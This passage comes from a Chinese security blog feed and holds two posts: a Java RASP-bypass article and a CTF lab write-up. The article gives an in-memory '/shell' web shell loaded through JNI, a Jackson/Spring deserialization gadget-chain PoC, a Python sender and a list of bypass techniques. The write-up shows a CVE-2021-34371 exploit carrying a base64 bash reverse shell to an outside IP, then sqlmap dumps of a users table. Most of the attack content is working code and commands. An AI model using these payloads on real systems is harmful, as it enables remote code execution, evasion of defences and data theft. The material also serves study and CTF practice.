punctuation">)</span><span class="token punctuation">;</span>            nativeLibraryCons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Object nativeLibraryObj <span class="token operator">=</span> nativeLibraryCons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> LIB_PATH<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            libs<span class="token punctuation">.</span><span class="token function">addElement</span><span class="token punctuation">(</span>nativeLibraryObj<span class="token punctuation">)</span><span class="token punctuation">;</span>            field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>cmdLoader<span class="token punctuation">,</span> libs<span class="token punctuation">)</span><span class="token punctuation">;</span>            load<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>nativeLibraryObj<span class="token punctuation">,</span> LIB_PATH<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            WebApplicationContext context <span class="token operator">=</span> <span class="token punctuation">(</span>WebApplicationContext<span class="token punctuation">)</span> RequestContextHolder<span class="token punctuation">.</span><span class="token function">currentRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingHandlerMapping mappingHandlerMapping <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>RequestMappingHandlerMapping<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Field configField <span class="token operator">=</span> mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            configField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration config <span class="token operator">=</span>                    <span class="token punctuation">(</span>RequestMappingInfo<span class="token punctuation">.</span>BuilderConfiguration<span class="token punctuation">)</span> configField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>mappingHandlerMapping<span class="token punctuation">)</span><span class="token punctuation">;</span>            Method method2 <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">,</span> HttpServletRequest<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> HttpServletResponse<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RequestMappingInfo info <span class="token operator">=</span> RequestMappingInfo<span class="token punctuation">.</span><span class="token function">paths</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">options</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span>                    <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            EvilClass springControllerMemShell <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            mappingHandlerMapping<span class="token punctuation">.</span><span class="token function">registerMapping</span><span class="token punctuation">(</span>info<span class="token punctuation">,</span> springControllerMemShell<span class="token punctuation">,</span> method2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> hi<span class="token punctuation">)</span> <span class="token punctuation">{</span>            hi<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        String cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cmd <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String execRes <span class="token operator">=</span> EvilClass<span class="token punctuation">.</span><span class="token function">execCmd</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>execRes<span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> SerializationHandler<span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span>DOM document<span class="token punctuation">,</span> DTMAxisIterator iterator<span class="token punctuation">,</span> SerializationHandler handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> TransletException <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>EVIL_JNI_BASE64是动态链接库的base64的值（dll文件或者so文件）</p><p>LIB_PATH是写在远程环境中的地址</p><p>把上面的EvilClass类编译成class文件，利用链子打</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span>node<span class="token punctuation">.</span>POJONode<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span>TemplatesImpl<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>AdvisedSupport<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>Templates<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ByteArrayOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectOutputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Constructor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Proxy<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Files<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span>Paths<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Base64<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Poc0</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        ClassPool pool = ClassPool.getDefault();</span><span class="token comment" spellcheck="true">//        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");</span><span class="token comment" spellcheck="true">//        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");</span><span class="token comment" spellcheck="true">//        ctClass0.removeMethod(writeReplace);</span><span class="token comment" spellcheck="true">//        ctClass0.toClass();</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> Files<span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span>Paths<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\HP\\IdeaProjects\\JavaChains\\target\\classes\\EvilClass.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Templates templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//利用 JdkDynamicAopProxy 进行封装使其稳定触发</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Constructor<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> cons <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>AdvisedSupport<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cons<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AdvisedSupport advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>        InvocationHandler handler <span class="token operator">=</span> <span class="token punctuation">(</span>InvocationHandler<span class="token punctuation">)</span> cons<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object proxyObj <span class="token operator">=</span> Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Templates<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        POJONode jsonNodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>proxyObj<span class="token punctuation">)</span><span class="token punctuation">;</span>        BadAttributeValueExpException exp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field val <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.management.BadAttributeValueExpException"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        val<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exp<span class="token punctuation">,</span>jsonNodes<span class="token punctuation">)</span><span class="token punctuation">;</span>        ByteArrayOutputStream barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String res <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> String field<span class="token punctuation">,</span> Object arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        Field f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>如果这里没有重写jackson的BaseJsonNode需要把注释取消掉，这条链子也比较稳定</p><p>使用python向远程反序列化点发包即可：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#结尾无 /</span>baseUrl <span class="token operator">=</span> <span class="token string">"http://172.23.2.67"</span>burp0_url <span class="token operator">=</span> baseUrl <span class="token operator">+</span> <span class="token string">"/read"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Transfer-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"chunked"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"text/plain"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">}</span>payload <span class="token operator">=</span> <span class="token triple-quoted-string string">""""""</span>hex_string <span class="token operator">=</span> hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>hex_string <span class="token operator">=</span> str<span class="token punctuation">(</span>hex_string<span class="token punctuation">)</span>burp0_data <span class="token operator">=</span> f<span class="token string">"{hex_string}\r\n{payload}\r\n0\r\n\r\n"</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">"/shell?cmd=ls /"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>然后就可以执行命令了：</p><p>​<img src="/Blogimages/Java%E5%AE%89%E5%85%A8--JNI%E7%BB%95%E8%BF%87RASP/image-20231123205812-xqfsigy.png" alt="image">​</p><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><p>借用<a href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP/#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">Java 反序列化绕过 RASP | DummyKitty&apos;s blog</a>作者的总结：</p><blockquote><ol><li>破坏 RASP 的开关。OpenRASP 中存在一个 hook 开关，反射修改这个 hook 开关可关闭所有拦截。Jrasp 没有明显的开关可以去操控但作者也实现的类似的效果。</li><li>熔断开关。很多商业化的产品有类似的CPU熔断机制，如果 CPU 达到 90%，就自动关闭 Rasp 的拦截。因此可以通过发送一些大的数据包或者流量，造成 CPU 的压力来触发 RASP 的熔断开关</li><li>伪装恶意类。很多 RASP 产品是通过堆栈信息回溯的方式来判断命令执行的地方从哪里来，例如检测 behinder 时会判断堆栈是否包含net.rebeyond.behinder类开头的信息。作者给出了伪装类名的方法。</li><li>新建线程绕过。新建线程可以绕过堆栈检查，但无法绕过黑白名单。</li><li>Bootstrap ClassLoader 加载绕过内存马检测。某些 RASP 在检测内存马时，通过判断当前类的 ClassLoader 是否存在对应的 .class 文件落地，使用Instrumentation.appendToBootstrapClassLoaderSearch 方法加载的 jar 包是以 Bootstrap ClassLoader 加载的，因此能够绕过检测。</li><li>通过 Unsafe 方式绕过。Unsafe.allocateInstance方法可以实例化一个对象而不调用它的构造方法，再去执行它的 Native 方法，从而绕过 Rasp 的检测。作者给出的示例中，通过直接执行 forkAndExec 的 Native 方法来执行命令。</li><li>通过 WindowsVirtualMachine 注入 ShellCode 加载。向自身进程植入并运行 ShellCode 绕过 RASP</li><li>Java 跨平台任意 Native 代码执行。</li><li>弱引用 GC. 一种依托 WeakReference 弱引用的命令执行方式，有别于常规的命令执行，因此在某些场景下可以绕过。</li><li>高权限场景卸载 RASP。通过获取 tools.jar 的路径，调用里面的 JVM API 来卸载 RASP</li></ol></blockquote><p>‍</p><p>这篇文章写的很详细：<a href="https://www.cnblogs.com/wh4am1/p/16780056.html">RASP的安全攻防研究实践 - admin-神风 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜Time</title>
      <link href="/2023/11/21/Time/"/>
      <url>/2023/11/21/Time/</url>
      
        <content type="html"><![CDATA[<h1 id="春秋云镜Time"><a href="#春秋云镜Time" class="headerlink" title="春秋云镜Time"></a>春秋云镜Time</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>​<img src="/Blogimages/Time/image-20231022095308-f78oh77.png" alt="image">​</p><p>初步扫描什么也没有：</p><p>​<img src="/Blogimages/Time/image-20231022095258-kf5qid2.png" alt="image">​</p><p>那就扫全端口</p><p>​<img src="/Blogimages/Time/image-20231022122739-0k89w6a.png" alt="image">​</p><p>扫了五分钟，发现了多个端口</p><p>7474是Neo4j的默认端口哦，这个可以打CVE-2021-34371-&gt;<a href="https://zgao.top/cve-2021-34371-neo4j-shell-server-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/">CVE-2021-34371 Neo4j Shell Server 反序列化漏洞复现 – Zgao&apos;s blog</a></p><p>​<img src="/Blogimages/Time/image-20231022123021-vdk3g95.png" alt="image"></p><p>工具下载：<a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">https://github.com/zwjjustdoit/CVE-2021-34371.jar</a></p><p>把命令改一下就行</p><pre class=" language-cmd"><code class="language-cmd">java -jar rhino_gadget.jar rmi://39.99.135.99:1337 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuMjQ5LjguMjYvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}"</code></pre><p>​<img src="/Blogimages/Time/image-20231022123149-c78ey77.png" alt="image">​</p><p>然后监听上线拿到flag1</p><p>​​​<img src="/Blogimages/Time/image-20231022102000-pcguibk.png" alt="image">​​​</p><p>注意这里有一个提示，关于Kerberos的</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>有内网了，上个fscan扫内网</p><pre class=" language-xml"><code class="language-xml">neo4j@ubuntu:~$ ./fscan_amd64 -h 172.22.6.36/24./fscan_amd64 -h 172.22.6.36/24   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.6.12     is alive(icmp) Target 172.22.6.25     is alive(icmp) Target 172.22.6.36     is alive(icmp) Target 172.22.6.38     is alive[*] Icmp alive hosts len is: 4172.22.6.38:22 open172.22.6.25:445 open172.22.6.12:445 open172.22.6.38:80 open172.22.6.12:88 open172.22.6.25:139 open172.22.6.12:139 open172.22.6.25:135 open172.22.6.12:135 open172.22.6.36:7687 open172.22.6.36:22 open[*] alive ports len is: 11start vulscan[*] WebTitle: http://172.22.6.38        code:200 len:1531   title:后台登录[*] NetBios: 172.22.6.25     XIAORANG\WIN2019[*] 172.22.6.12  (Windows Server 2016 Datacenter 14393)[*] NetInfo:[*]172.22.6.12   [->]DC-PROGAME   [->]172.22.6.12[*] NetBios: 172.22.6.12     [+]DC DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393[*] NetInfo:[*]172.22.6.25   [->]WIN2019   [->]172.22.6.25[*] WebTitle: https://172.22.6.36:7687  code:400 len:50     title:None已完成 11/11[*] 扫描结束,耗时: 14.579091947s</code></pre><p>发现有一个web服务，优先搞这个</p><pre class=" language-xml"><code class="language-xml">[*] WebTitle: http://172.22.6.38        code:200 len:1531   title:后台登录</code></pre><p>有个sql注入，因为弱口令进不去….</p><p>把数据包载下来,这里用burp抓数据包测试的时候可以挂个代理就能访问了：</p><p>​<img src="/Blogimages/Time/image-20231022133450-sagby6h.png" alt="image">​</p><p>配置socks proxy，填好对应的ip和端口即可，如果有设置密码需要填写密码</p><p>抓到的数据包如下：</p><pre class=" language-xml"><code class="language-xml">POST /index.php HTTP/1.1Host: 172.22.6.38Content-Length: 31Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://172.22.6.38Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://172.22.6.38/index.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: closeusername=admin&amp;password=admin</code></pre><pre class=" language-cmd"><code class="language-cmd">python sqlmap.py -r poc.txt --proxy socks5://xxx.xxx.xxx.xxx:xxxx -D oa_db -T oa_f1Agggg -C flag02 --dump</code></pre><p><img src="/Blogimages/Time/image-20231022103714-u8b3xoo.png" alt="image"></p><p>可以拿到flag，之后束手无策</p><p>其实还有一个user表：</p><pre class=" language-xml"><code class="language-xml">C:\qingfeng\Tools\sqlmap-1.7>python sqlmap.py -r poc.txt --proxy socks5://123.249.8.26:25599 -D oa_db -T oa_users --columns --dump+-----+----------------------------+-------------+-----------------+| id  | email                      | phone       | username        |+-----+----------------------------+-------------+-----------------+[10:38:11] [WARNING] console output will be trimmed to last 256 rows due to large table size| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        || 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        || 247 | buning@xiaorang.lab        | 13046481392 | BU NING         || 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         || 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         || 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           || 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      || 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        || 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       || 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          || 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         || 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          || 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           || 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    || 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         || 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         || 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         || 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         || 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         || 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       || 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         || 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          || 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        || 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  || 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       || 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        || 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       || 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       || 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          || 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        || 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       || 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        || 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        || 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     || 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         || 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     || 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        || 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         || 283 | maoda@xiaorang.lab         | 